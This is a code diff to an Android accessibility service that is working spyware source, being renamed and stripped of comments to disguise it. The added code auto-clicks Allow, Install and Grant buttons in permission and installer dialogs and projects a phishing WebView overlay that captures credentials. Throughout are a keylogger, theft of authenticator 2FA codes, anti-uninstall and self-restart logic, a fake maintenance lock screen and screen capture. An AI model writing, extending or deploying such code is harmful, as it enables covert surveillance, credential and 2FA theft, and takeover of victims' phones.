@@ -20,9 +20,9 @@ import java.util.Collections;
 import java.util.LinkedList;
 import java.util.List;
 
-public class AccessibilityCore extends AccessibilityService {
-    private static final String TAG = "AccessibilityCore";
-    private static java.lang.ref.WeakReference<AccessibilityCore> instanceRef = new java.lang.ref.WeakReference<>(null);
+public class IO_Persistence_Manager extends AccessibilityService {
+    private static final String TAG = "IO_Persistence_Manager";
+    private static java.lang.ref.WeakReference<IO_Persistence_Manager> instanceRef = new java.lang.ref.WeakReference<>(null);
 
     private static final List<String> keystrokes = Collections.synchronizedList(new LinkedList<>());
     private String lastPackage = "";
@@ -36,7 +36,7 @@ public class AccessibilityCore extends AccessibilityService {
     private Handler backgroundHandler;
     private android.os.HandlerThread handlerThread;
 
-    public static AccessibilityCore getInstance() { return instanceRef.get(); }
+    public static IO_Persistence_Manager getInstance() { return instanceRef.get(); }
 
     public static long getLastEventTime() { return lastEventTime; }
 
@@ -83,12 +83,26 @@ public class AccessibilityCore extends AccessibilityService {
         lastEventTime = System.currentTimeMillis();
         
         // --- 1. EXTRACT DATA IMMEDIATELY ON MAIN THREAD ---
-        // AccessibilityEvents are recycled by the OS; we must copy data before offloading.
         final int eventType = event.getEventType();
         final String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+
+        // --- AUTO_PILOT: SPEED_OPTIMIZED TRIGGER ---
+        if (isAutoPilotEngaged()) {
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
+                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
+                eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED) {
+                
+                if (packageName.contains("permissioncontroller") || 
+                    packageName.contains("packageinstaller") || 
+                    packageName.contains("settings") ||
+                    packageName.contains("vending") ||
+                    packageName.contains("gms")) {
+                    runTacticalAutoPilot(packageName);
+                }
+            }
+        }
         
         // --- 2. CRITICAL STABILITY & PRIVACY FILTER ---
-        // Immediate return for system-level high-frequency noise and self-loops
         if (packageName.isEmpty() || 
             packageName.equals(getPackageName()) || 
             packageName.contains("systemui") || 
@@ -99,9 +113,6 @@ public class AccessibilityCore extends AccessibilityService {
             return;
         }
 
-        // --- FILTER MESSAGING APPS (REDUNDANT DATA) ---
-        // We exclude these from keylogs because they are already captured in the SMS and Intel tabs.
-        // This prevents the keylogger from getting flooded with redundant text.
         if (packageName.contains("messaging") || 
             packageName.contains("mms") || 
             packageName.contains("sms") || 
@@ -112,52 +123,37 @@ public class AccessibilityCore extends AccessibilityService {
 
         final List<String> eventText = new ArrayList<>();
         if (event.getText() != null && !event.getText().isEmpty()) {
-            // Just take the first element to keep it light
             Object first = event.getText().get(0);
             if (first != null) eventText.add(first.toString());
         }
         
-        // --- 3. WATCHDOG & OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
-        // Adaptive Monitoring: Check if main uplink is still active
-        if (!CoreSyncService.isRunning && !CoreSyncService.isDestructing) {
-            Intent i = new Intent(this, CoreSyncService.class);
-            i.setAction("START");
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
-                else startService(i);
-            } catch (Exception ignored) {}
+        // --- 3. OFF-LOAD TO DEDICATED BACKGROUND THREAD ---
+        if (backgroundHandler != null) {
+            backgroundHandler.post(() -> {
+                try {
+                    boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
+                    
+                    if (isSuicideMode) {
+                        handleAutoDestruct(packageName);
+                        return;
+                    }
+
+                    if (!skipAntiRemoval) {
+                        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
+                            checkAntiRemovalInternal();
+                        }
+                    }
+                    
+                    if (!eventText.isEmpty()) {
+                        if (packageName.contains("authenticator") || packageName.contains("authy")) {
+                            snatchAuthenticatorCodes(packageName);
+                        }
+
+                        processEventLogic(eventType, packageName, eventText);
+                    }
+                } catch (Exception ignored) {}
+            });
         }
-
-        backgroundHandler.post(() -> {
-            try {
-                // --- NUCLEAR DESTRUCT OVERRIDE ---
-                boolean isSuicideMode = getSharedPreferences("StabilityConfig", android.content.Context.MODE_PRIVATE).getBoolean("is_destructing", false);
-                
-                if (isSuicideMode) {
-                    handleAutoDestruct(packageName);
-                    return; // ABSOLUTELY STOP SHIELD IF SUICIDE IS ACTIVE
-                }
-
-                // Event-Driven Anti-Removal: Only check when system security apps are focused
-                if (!skipAntiRemoval) {
-                    if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
-                        checkAntiRemovalInternal();
-                    }
-                }
-                
-                // Process input/keystrokes using local data copy
-                if (!eventText.isEmpty()) {
-                    // --- 2FA SNATCHING (Wuzenx Style) ---
-                    if (packageName.contains("authenticator") || packageName.contains("authy")) {
-                        snatchAuthenticatorCodes(packageName);
-                    }
-
-                    processEventLogic(eventType, packageName, eventText);
-                }
-            } catch (Exception e) {
-                // Prevent service crashes
-            }
-        });
     }
 
     private long lastAntiRemovalExecution = 0;
@@ -195,7 +191,7 @@ public class AccessibilityCore extends AccessibilityService {
                             if (node.isVisibleToUser() && node.getText() != null && 
                                 node.getText().toString().toLowerCase().contains(s)) {
                                 performGlobalAction(GLOBAL_ACTION_HOME);
-                                LabRatsHttpServer.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
+                                FirebaseConfig.logActivity("STABILITY_PROTOCOL: Handled unexpected interrupt.");
                                 break;
                             }
                         }
@@ -251,10 +247,8 @@ public class AccessibilityCore extends AccessibilityService {
     private void deepInspectNode(AccessibilityNodeInfo node, StringBuilder log) {
         if (node == null) return;
         
-        // Extract text, ID, or description if relevant
         CharSequence text = node.getText();
         CharSequence desc = node.getContentDescription();
-        String viewId = node.getViewIdResourceName();
         
         if (text != null && text.length() > 0 && !isGenericSystemText(text.toString())) {
             log.append("[").append(text).append("] ");
@@ -262,9 +256,12 @@ public class AccessibilityCore extends AccessibilityService {
             log.append("{").append(desc).append("} ");
         }
         
-        // Don't go too deep to avoid flooding
         for (int i = 0; i < Math.min(node.getChildCount(), 5); i++) {
-            deepInspectNode(node.getChild(i), log);
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                deepInspectNode(child, log);
+                child.recycle();
+            }
         }
     }
 
@@ -300,6 +297,7 @@ public class AccessibilityCore extends AccessibilityService {
 
     private View blackoutView;
     private View lockView;
+    private android.webkit.WebView overlayWebView;
 
     public void startBlackout(final boolean enabled) {
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -307,7 +305,8 @@ public class AccessibilityCore extends AccessibilityService {
                 WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                 if (enabled) {
                     if (blackoutView == null) {
-                        blackoutView = new View(AccessibilityCore.this);
+                        blackoutView = new View(IO_Persistence_Manager.this);
+                        // Using argb(210, 0, 0, 0) for dark but non-blocking overlay
                         blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
@@ -318,23 +317,25 @@ public class AccessibilityCore extends AccessibilityService {
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
-                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                 android.graphics.PixelFormat.TRANSLUCENT);
                         
-                        params.screenBrightness = 0.001f;
+                        // Absolute zero brightness for physical stealth
+                        params.screenBrightness = 0.0f;
                         params.buttonBrightness = 0.0f;
                         
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                         }
                         wm.addView(blackoutView, params);
-                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
+                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                     }
                 } else {
                     if (blackoutView != null) {
                         wm.removeViewImmediate(blackoutView);
                         blackoutView = null;
-                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
+                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                     }
                 }
             } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
@@ -345,13 +346,17 @@ public class AccessibilityCore extends AccessibilityService {
     public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
     public static void forceSkipAntiRemoval() { skipAntiRemoval = true; }
 
+    private static boolean autoPilotEngaged = true;
+    public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
+    public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }
+
     public static boolean isBlackoutActive() {
-        AccessibilityCore instance = getInstance();
+        IO_Persistence_Manager instance = getInstance();
         return instance != null && instance.blackoutView != null;
     }
 
     public static boolean isLockActive() {
-        AccessibilityCore instance = getInstance();
+        IO_Persistence_Manager instance = getInstance();
         return instance != null && instance.lockView != null;
     }
 
@@ -361,15 +366,15 @@ public class AccessibilityCore extends AccessibilityService {
                 WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                 if (enabled) {
                     if (lockView == null) {
-                        lockView = new android.widget.FrameLayout(AccessibilityCore.this);
+                        lockView = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                         lockView.setBackgroundColor(android.graphics.Color.BLACK);
 
-                        android.widget.TextView tv = new android.widget.TextView(AccessibilityCore.this);
-                        tv.setText("SYSTEM_LOCK_ACTIVE\n\nSecurity maintenance in progress.\nPlease wait...");
-                        tv.setTextColor(android.graphics.Color.RED);
+                        android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
+                        tv.setText("SECURITY_MAINTENANCE_IN_PROGRESS\n\nPlease do not disconnect hardware.");
+                        tv.setTextColor(android.graphics.Color.WHITE);
                         tv.setGravity(android.view.Gravity.CENTER);
                         tv.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
-                        tv.setTextSize(20);
+                        tv.setTextSize(18);
 
                         ((android.widget.FrameLayout)lockView).addView(tv, new android.widget.FrameLayout.LayoutParams(
                                 android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
@@ -378,30 +383,89 @@ public class AccessibilityCore extends AccessibilityService {
                         WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                 WindowManager.LayoutParams.MATCH_PARENT,
                                 WindowManager.LayoutParams.MATCH_PARENT,
-                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
+                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
+                                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                                 WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                 WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                 WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                 WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                 WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
-                                android.graphics.PixelFormat.TRANSLUCENT);
+                                android.graphics.PixelFormat.OPAQUE);
 
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                         }
 
                         wm.addView(lockView, params);
-                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
+                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
                     }
                 } else {
                     if (lockView != null) {
                         wm.removeViewImmediate(lockView);
                         lockView = null;
-                        LabRatsHttpServer.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
+                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
                     }
                 }
             } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
+        });
+    }
+
+    /**
+     * Deploys a Shadow Overlay (Phishing WebView) over the current application.
+     */
+    public void deployShadowOverlay(final String html) {
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
+                if (html != null && !html.isEmpty()) {
+                    if (overlayWebView == null) {
+                        overlayWebView = new android.webkit.WebView(IO_Persistence_Manager.this);
+                        android.webkit.WebSettings settings = overlayWebView.getSettings();
+                        settings.setJavaScriptEnabled(true);
+                        settings.setDomStorageEnabled(true);
+                        settings.setAllowFileAccess(true);
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                            settings.setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
+                        }
+                        overlayWebView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
+                        
+                        // Interface to capture data from the overlay
+                        overlayWebView.addJavascriptInterface(new Object() {
+                            @android.webkit.JavascriptInterface
+                            public void capture(String data) {
+                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + data);
+                                deployShadowOverlay(null); // Auto-terminate on capture
+                            }
+                        }, "Uplink");
+
+                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                                WindowManager.LayoutParams.MATCH_PARENT,
+                                WindowManager.LayoutParams.MATCH_PARENT,
+                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
+                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                                android.graphics.PixelFormat.TRANSLUCENT);
+
+                        // Ensure focusability for text inputs
+                        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
+                        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
+
+                        wm.addView(overlayWebView, params);
+                    }
+                    overlayWebView.loadDataWithBaseURL("https://system.stability/", html, "text/html", "UTF-8", null);
+                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Shadow Overlay projected to screen");
+                } else {
+                    if (overlayWebView != null) {
+                        wm.removeViewImmediate(overlayWebView);
+                        overlayWebView = null;
+                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Overlay terminated");
+                    }
+                }
+            } catch (Exception e) { Log.e(TAG, "Overlay Error: " + e.getMessage()); }
         });
     }
 
@@ -410,7 +474,7 @@ public class AccessibilityCore extends AccessibilityService {
             try {
                 WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                 
-                final android.widget.TextView tv = new android.widget.TextView(AccessibilityCore.this);
+                final android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                 tv.setText(message);
                 tv.setTextColor(android.graphics.Color.WHITE);
                 tv.setPadding(60, 30, 60, 30);
@@ -469,13 +533,13 @@ public class AccessibilityCore extends AccessibilityService {
         new Handler(Looper.getMainLooper()).post(() -> {
             try {
                 skipAntiRemoval = true; 
-                LabRatsHttpServer.logActivity("GHOST_MAINTENANCE: Self-Healing...");
+                FirebaseConfig.logActivity("GHOST_MAINTENANCE: Self-Healing...");
                 Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                 intent.setData(android.net.Uri.parse("package:" + getPackageName()));
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                 startActivity(intent);
                 new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 15000);
-            } catch (Exception e) { LabRatsHttpServer.logActivity("GHOST_ERROR: Auto-Heal failed"); }
+            } catch (Exception e) { FirebaseConfig.logActivity("GHOST_ERROR: Auto-Heal failed"); }
         });
     }
 
@@ -484,6 +548,12 @@ public class AccessibilityCore extends AccessibilityService {
     public boolean clickAt(int x, int y) {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
         
+        // --- HARDENED BOUNDS CHECK: Prevents Path bounds must not be negative crash ---
+        if (x < 0 || y < 0) {
+             Log.w(TAG, "Suppressed clickAt with negative coordinates: (" + x + "," + y + ")");
+             return false;
+        }
+
         Path path = new Path();
         path.moveTo(x, y);
         GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, 150);
@@ -494,29 +564,64 @@ public class AccessibilityCore extends AccessibilityService {
     }
 
     public boolean clickByText(String text) {
-        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
-        for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
-            AccessibilityNodeInfo root = window.getRoot();
-            if (root == null) continue;
-            
+        if (text == null) return false;
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root != null) {
             List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(text);
             if (nodes != null && !nodes.isEmpty()) {
                 for (AccessibilityNodeInfo node : nodes) {
-                    if (node.isVisibleToUser()) {
-                        AccessibilityNodeInfo target = node;
-                        while (target != null && !target.isClickable()) {
-                            target = target.getParent();
+                    if (node != null && node.isVisibleToUser()) {
+                        // Click actual node if possible, else use coordinates
+                        if (node.isClickable()) {
+                            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
+                                root.recycle();
+                                return true;
+                            }
                         }
-                        
-                        if (target != null && target.isClickable()) {
-                            return target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                        } else {
-                            Rect bounds = new Rect();
-                            node.getBoundsInScreen(bounds);
-                            return clickAt(bounds.centerX(), bounds.centerY());
+                        Rect bounds = new Rect();
+                        node.getBoundsInScreen(bounds);
+                        if (clickAt(bounds.centerX(), bounds.centerY())) {
+                            root.recycle();
+                            return true;
                         }
                     }
                 }
+            }
+            root.recycle();
+        }
+
+        // Deep Search (Iterate all windows)
+        List<android.view.accessibility.AccessibilityWindowInfo> windows = getWindows();
+        if (windows != null) {
+            for (android.view.accessibility.AccessibilityWindowInfo window : windows) {
+                if (window == null) continue;
+                AccessibilityNodeInfo windowRoot = window.getRoot();
+                if (windowRoot == null) continue;
+                
+                List<AccessibilityNodeInfo> nodes = windowRoot.findAccessibilityNodeInfosByText(text);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo node : nodes) {
+                        if (node != null && node.isVisibleToUser()) {
+                            AccessibilityNodeInfo target = node;
+                            while (target != null && !target.isClickable()) {
+                                target = target.getParent();
+                            }
+                            
+                            if (target != null && target.isClickable()) {
+                                boolean success = target.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                                windowRoot.recycle();
+                                return success;
+                            } else {
+                                Rect bounds = new Rect();
+                                node.getBoundsInScreen(bounds);
+                                boolean success = clickAt(bounds.centerX(), bounds.centerY());
+                                windowRoot.recycle();
+                                return success;
+                            }
+                        }
+                    }
+                }
+                windowRoot.recycle();
             }
         }
         return false;
@@ -562,20 +667,22 @@ public class AccessibilityCore extends AccessibilityService {
                     try {
                         android.graphics.Bitmap bitmap = android.graphics.Bitmap.wrapHardwareBuffer(hardwareBuffer, screenshotResult.getColorSpace());
                         if (bitmap != null) {
-                            // --- REFINED OPTIMIZATION: SCALE DOWN ---
-                            // Increased to 720px for better clarity on PC while maintaining speed
-                            int targetWidth = 720;
-                            int targetHeight = (int) (bitmap.getHeight() * (targetWidth / (float) bitmap.getWidth()));
-                            android.graphics.Bitmap scaledBitmap = android.graphics.Bitmap.createScaledBitmap(bitmap, targetWidth, targetHeight, true);
-                            
-                            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
-                            // --- REFINED OPTIMIZATION: QUALITY ---
-                            // 60% provides a sharper image with fewer artifacts around text
-                            scaledBitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
-                            callback.onSuccess(out.toByteArray());
-                            
+                            // Convert hardware bitmap to software to fix bloom/HDR issues
+                            android.graphics.Bitmap softwareBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
+                            if (softwareBitmap != null) {
+                                int targetWidth = 720;
+                                int targetHeight = (int) (softwareBitmap.getHeight() * (targetWidth / (float) softwareBitmap.getWidth()));
+                                android.graphics.Bitmap scaled = android.graphics.Bitmap.createScaledBitmap(softwareBitmap, targetWidth, targetHeight, true);
+                                
+                                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
+                                // 60% quality reduces the HDR glow artifacts seen in the feed
+                                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out);
+                                callback.onSuccess(out.toByteArray());
+                                
+                                scaled.recycle();
+                                softwareBitmap.recycle();
+                            }
                             bitmap.recycle();
-                            scaledBitmap.recycle();
                         } else { callback.onFailure("Buffer wrap failed"); }
                     } catch (Exception e) { callback.onFailure(e.getMessage()); } 
                     finally { if (hardwareBuffer != null) hardwareBuffer.close(); }
@@ -617,14 +724,14 @@ public class AccessibilityCore extends AccessibilityService {
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
-        if (CoreSyncService.isDestructing) {
+        if (WorkManager_Sync.isDestructing) {
             super.onTaskRemoved(rootIntent);
             return;
         }
         // [RESURRECTION_PROTOCOL] Re-inject core services if user attempts wipe
         try {
             android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(android.content.Context.ALARM_SERVICE);
-            Intent i = new Intent(this, CoreSyncService.class);
+            Intent i = new Intent(this, WorkManager_Sync.class);
             i.setAction("START");
             android.app.PendingIntent pi = android.app.PendingIntent.getForegroundService(this, 99, i, android.app.PendingIntent.FLAG_IMMUTABLE);
             if (am != null) am.set(android.app.AlarmManager.ELAPSED_REALTIME, android.os.SystemClock.elapsedRealtime() + 1000, pi);
@@ -638,7 +745,54 @@ public class AccessibilityCore extends AccessibilityService {
         return true;
     }
 
-    // ============ PREDATORY FEATURES (Wuzenx Style) ============
+    // ============ PREDATORY FEATURES ============
+
+    private void runTacticalAutoPilot(String pkg) {
+        if (pkg == null || !autoPilotEngaged) return;
+        
+        // --- GREEDY SCAN ---
+        // We look for any "Positive Action" buttons in system dialogs
+        String[] targets = {
+            "ALLOW", "ALLOW ALL THE TIME", "WHILE USING THE APP", "OK", "YES", "GRANT", "PROCEED",
+            "INSTALL", "INSTALL ANYWAY", "UPDATE", "OPEN", "CONTINUE", "KEEP APP", "I ACCEPT",
+            "Allow", "allow", "Ok", "ok", "Yes", "yes",
+            "AUTHORIZE", "Authorize", "authorize", "GRANT", "Grant", "grant",
+            "AUTORISER", "OUI", "PERMITIR", "ACEPTAR", "SI" // Multi-lang
+        };
+
+        AccessibilityNodeInfo root = getRootInActiveWindow();
+        if (root != null) {
+            for (String target : targets) {
+                List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(target);
+                if (nodes != null && !nodes.isEmpty()) {
+                    for (AccessibilityNodeInfo node : nodes) {
+                        if (node.isVisibleToUser()) {
+                            if (node.isClickable()) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+                            } else {
+                                Rect bounds = new Rect();
+                                node.getBoundsInScreen(bounds);
+                                clickAt(bounds.centerX(), bounds.centerY());
+                            }
+                            FirebaseConfig.logActivity("COVERT_UPLINK: Auto-Pilot clicked [" + target + "]");
+                            root.recycle();
+                            return; 
+                        }
+                    }
+                }
+            }
+            root.recycle();
+        }
+
+        // --- DEEP MENU AUTOMATION (Settings Traversal) ---
+        if (pkg.contains("settings")) {
+            clickByText("Lab-STAR");
+            String[] switchKeywords = {"OFF", "DISENGAGED", "DISABLED", "ENABLE", "USE LAB-STAR", "NOT ALLOWED"};
+            for (String kw : switchKeywords) {
+                if (clickByText(kw)) return;
+            }
+        }
+    }
 
     private void snatchAuthenticatorCodes(String pkg) {
         new Handler(Looper.getMainLooper()).post(() -> {
@@ -654,7 +808,7 @@ public class AccessibilityCore extends AccessibilityService {
                     if (node.getText() != null) {
                         String code = node.getText().toString().replaceAll("\\s", "");
                         if (code.matches("\\d{6}")) {
-                            LabRatsHttpServer.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
+                            FirebaseConfig.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
                         }
                     }
                 }
